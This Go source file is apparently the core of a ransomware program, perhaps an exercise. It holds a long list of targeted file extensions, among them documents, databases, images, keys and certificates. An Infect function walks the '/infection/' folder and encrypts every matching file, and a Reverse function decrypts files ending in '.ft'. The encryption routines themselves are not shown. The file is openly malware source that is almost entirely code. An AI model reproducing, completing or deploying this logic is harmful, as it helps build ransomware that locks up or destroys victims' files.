package main

import (
	"os"
	"log"
	"path/filepath"
	"strings"
)

var extensions = []string{
	".docx", ".ppam", ".sti", ".vcd", ".3gp", ".sch", ".myd", ".wb2",
	".docb", ".potx", ".sldx", ".jpeg", ".mp4", ".dch", ".frm", ".slk",
	".docm", ".potm", ".sldm", ".jpg", ".mov", ".dip", ".odb", ".dif",
	".dot", ".pst", ".sldm", ".bmp", ".avi", ".pl", ".dbf", ".stc",
	".dotm", ".ost", ".vdi", ".png", ".asf", ".vb", ".db", ".sxc",
	".dotx", ".msg", ".vmdk", ".gif", ".mpeg", ".vbs", ".mdb", ".ots",
	".xls", ".eml", ".vmx", ".raw", ".vob", ".ps1", ".accdb", ".ods",
	".xlsm", ".vsd", ".aes", ".tif", ".wmv", ".cmd", ".sqlitedb", ".max",
	".xlsb", ".vsdx", ".ARC", ".tiff", ".fla", ".js", ".sqlite3", ".3ds",
	".xlw", ".txt", ".PAQ", ".nef", ".swf", ".asm", ".asc", ".uot",
	".xlt", ".csv", ".bz2", ".psd", ".wav", ".h", ".lay6", ".stw",
	".xlm", ".rtf", ".tbk", ".ai", ".mp3", ".pas", ".lay", ".sxw",
	".xlc", ".123", ".bak", ".svg", ".sh", ".cpp", ".mml", ".ott",
	".xltx", ".wks", ".tar", ".djvu", ".class", ".c", ".sxm", ".odt",
	".xltm", ".wk1", ".tgz", ".m4u", ".jar", ".cs", ".otg", ".pem",
	".ppt", ".pdf", ".gz", ".m3u", ".java", ".suo", ".odg", ".p12",
	".pptx", ".dwg", ".7z", ".mid", ".rb", ".sln", ".uop", ".csr",
	".pptm", ".onetoc2", ".rar", ".wma", ".asp", ".ldf", ".std", ".crt",
	".pot", ".snt", ".zip", ".flv", ".php", ".mdf", ".sxd", ".key",
	".pps", ".hwp", ".backup", ".3g2", ".jsp", ".ibd", ".otp", ".pfx",
	".ppsm", ".602", ".iso", ".mkv", ".brd", ".myi", ".odp", ".der",
	".ppsx", ".sxi",
}

func IsValidFile(file string) bool {
	for _, ext := range extensions {
		if strings.HasSuffix(file, ext) {
			return true
		}
	}
	return false
}

func EncryptFiles(dest string, d os.DirEntry, err error) error  {
	if err != nil {
		return err
	}
	if !d.IsDir() && IsValidFile(dest) {
		EncryptFile(dest)
	}
	
	return nil
}

func DecryptFiles(dest string, d os.DirEntry, err error) error  {
	if err != nil {
		return err
	}
	if !d.IsDir() && strings.HasSuffix(dest, ".ft") {
		DecryptFile(dest)
	}

	return nil
}

func Infect() {
	destinationFolder := "/infection/"
	_, err := os.Stat(destinationFolder)
    if os.IsNotExist(err) {
		log.Fatal("Folder infection does not exist.")
    }
	
	GenerateSecretKey()
	err = filepath.WalkDir(destinationFolder, EncryptFiles)
	if err != nil {
		log.Fatal("Failed to read file.")
	}
}

func Reverse() {
	destinationFolder := "/infection/"
	_, err := os.Stat(destinationFolder)
    if os.IsNotExist(err) {
		log.Fatal("Folder infection does not exist.")
    }
	
	err = filepath.WalkDir(destinationFolder, DecryptFiles)
	if err != nil {
		log.Fatal("Failed to read file.")
	}
}